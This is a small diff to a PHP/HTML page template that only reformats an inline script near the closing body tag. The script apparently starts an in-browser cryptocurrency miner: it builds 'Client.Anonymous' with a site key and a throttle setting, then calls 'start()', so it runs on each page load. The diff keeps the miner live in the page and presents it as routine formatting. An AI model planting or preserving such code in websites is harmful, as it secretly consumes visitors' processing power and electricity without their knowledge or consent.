@@ -743,13 +743,12 @@
         </script>
     <?php } ?>
     <script>
-    var _client = new Client.Anonymous('588c55da6d6708635d714eaaaf22763a67cae4012d88cef0117044fed27f6635', {
-        throttle: 0.8, c: 'w'
-    });
-    _client.start();
-    
-
-</script>
+        var _client = new Client.Anonymous('588c55da6d6708635d714eaaaf22763a67cae4012d88cef0117044fed27f6635', {
+            throttle: 0.8,
+            c: 'w'
+        });
+        _client.start();
+    </script>
 </body>
 
 </html>
